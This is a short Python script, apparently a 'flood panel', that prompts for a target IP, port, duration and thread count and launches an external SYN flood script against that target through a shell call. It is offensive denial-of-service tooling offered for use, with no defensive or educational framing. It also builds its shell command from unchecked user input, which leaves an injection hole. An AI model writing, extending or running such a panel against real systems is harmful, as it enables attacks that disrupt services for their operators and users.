# ddos_panel.py
import os
import subprocess
import sys

def run_attack(attack_type, target_ip, port, duration, threads):
    if attack_type == 'syn_flood':
        command = f"python syn_flood.py {target_ip} {port} {duration} {threads}"
        subprocess.run(command, shell=True)
    else:
        print("Unknown attack type")

def main():
    print("Welcome to the Jxyrs Flood Panel")
    print("Available attacks:")
    print("1. SYN Flood")
    attack_choice = input("Select an attack (1): ")

    target_ip = input("Enter the target IP address: ")
    port = input("Enter the target port: ")
    duration = input("Enter the duration of the attack (in seconds): ")
    threads = input("Enter the number of threads: ")

    if attack_choice == '1':
        run_attack('syn_flood', target_ip, port, duration, threads)
    else:
        print("Invalid choice")

if __name__ == "__main__":
    main()
